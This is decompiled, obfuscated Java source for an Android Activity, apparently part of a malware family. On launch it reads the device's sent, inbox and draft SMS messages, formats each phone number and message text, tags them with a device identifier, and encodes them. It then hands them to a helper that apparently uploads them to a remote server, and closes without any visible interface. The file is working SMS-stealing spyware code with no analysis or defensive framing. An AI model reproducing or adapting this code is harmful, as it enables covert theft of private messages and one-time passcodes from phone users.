package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class bdxyqqt extends Activity {

    /* renamed from: a */
    C0034b f444a = new C0034b();

    /* renamed from: a */
    private String m299a(String str) {
        String str2;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("content://");
            sb.append(str);
            Cursor query = getContentResolver().query(Uri.parse(sb.toString()), null, null, null, null);
            startManagingCursor(query);
            if (query.getCount() <= 0) {
                return "";
            }
            String str3 = "";
            if (str.equals("sms/sent")) {
                str3 = "-----SENT-----";
            } else if (str.equals("sms/inbox")) {
                str3 = "-----INBOX-----";
            } else if (str.equals("sms/draft")) {
                str3 = "-----DRAFT-----";
            }
            while (query.moveToNext()) {
                String string = query.getString(12);
                if (string == null) {
                    str2 = "";
                } else {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(string);
                    sb2.append(" ");
                    str2 = sb2.toString();
                }
                StringBuilder sb3 = new StringBuilder();
                sb3.append(str3);
                sb3.append(10);
                sb3.append("Number: (");
                sb3.append(query.getString(2));
                sb3.append(")");
                sb3.append(10);
                sb3.append("Text: ");
                sb3.append(str2);
                sb3.append(query.getString(13));
                str3 = sb3.toString();
            }
            return str3;
        } catch (Exception unused) {
            return "";
        }
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String a = m299a("sms/sent");
        String a2 = m299a("sms/inbox");
        String a3 = m299a("sms/draft");
        if (!a.equals("")) {
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            C0034b bVar = this.f444a;
            StringBuilder sb2 = new StringBuilder();
            sb2.append(this.f444a.mo247q(this));
            sb2.append("|");
            sb2.append(a);
            sb2.append("|");
            sb.append(bVar.mo225c(sb2.toString()));
            this.f444a.mo218b(this, "4", sb.toString());
        }
        if (!a2.equals("")) {
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            C0034b bVar2 = this.f444a;
            StringBuilder sb4 = new StringBuilder();
            sb4.append(this.f444a.mo247q(this));
            sb4.append("|");
            sb4.append(a2);
            sb4.append("|");
            sb3.append(bVar2.mo225c(sb4.toString()));
            this.f444a.mo218b(this, "4", sb3.toString());
        }
        if (!a3.equals("")) {
            StringBuilder sb5 = new StringBuilder();
            sb5.append("p=");
            C0034b bVar3 = this.f444a;
            StringBuilder sb6 = new StringBuilder();
            sb6.append(this.f444a.mo247q(this));
            sb6.append("|");
            sb6.append(a3);
            sb6.append("|");
            sb5.append(bVar3.mo225c(sb6.toString()));
            this.f444a.mo218b(this, "4", sb5.toString());
        }
        finish();
    }
}
